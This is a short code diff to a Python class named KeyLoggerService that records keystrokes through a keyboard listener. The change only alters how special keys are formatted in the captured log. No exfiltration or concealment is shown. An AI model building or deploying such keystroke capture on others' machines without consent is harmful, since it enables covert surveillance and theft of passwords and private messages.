@@ -29,7 +29,7 @@ class KeyLoggerService(IKeyLogger):
         try:
             self.keys.append(key.char)
         except AttributeError:
-            self.keys.append(str(key))
+            self.keys.append(" {" + str(key) + "} " )
 
     def start_logging(self):
         self.listener = keyboard.Listener(on_press=self.on_press)
